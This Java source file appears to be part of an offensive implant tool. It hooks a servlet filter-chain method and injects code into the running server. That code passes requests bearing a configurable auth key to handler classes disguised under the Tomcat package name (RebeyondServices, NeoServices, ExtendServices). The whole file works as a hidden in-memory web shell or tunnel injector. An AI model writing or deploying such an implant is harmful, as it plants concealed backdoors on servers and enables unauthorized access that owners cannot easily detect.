package indi.augusttheodor.stage;

import indi.augusttheodor.Options;

import java.util.HashMap;
import java.util.Map;

public abstract class ServletFilterChainStage implements Stage { //基于Servlet的Stage

    protected abstract String getClassName();
    protected abstract String getMethodName();

    @Override
    public Map<String, String[]> getHookPoints() {
        Map<String, String[]> re = new HashMap<>();
        re.put(getClassName(), new String[]{getMethodName()});
        return re;
    }

    @Override
    public void configure(Options options) {
        if (options.hasOption("a")) {
            String[] authKey = options.getOptionValue("a").split(":");
            ServletCompat.AUTH_KEY = authKey[0];
            ServletCompat.AUTH_VALUE = authKey[1];
        }
    }

    @Override
    public String getInjectedSource(String className, String methodName, Options options) {
        return "{" +
                "java.util.Map s=indi.augusttheodor.stage.ServletCompat.handle($1,$2);" +
                "if(s!=null){" +
                "   org.apache.catalina.core.RebeyondServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
                "   org.apache.catalina.core.ExtendServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
                "   org.apache.catalina.core.NeoServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
                "   }" +
                "}";
    }
}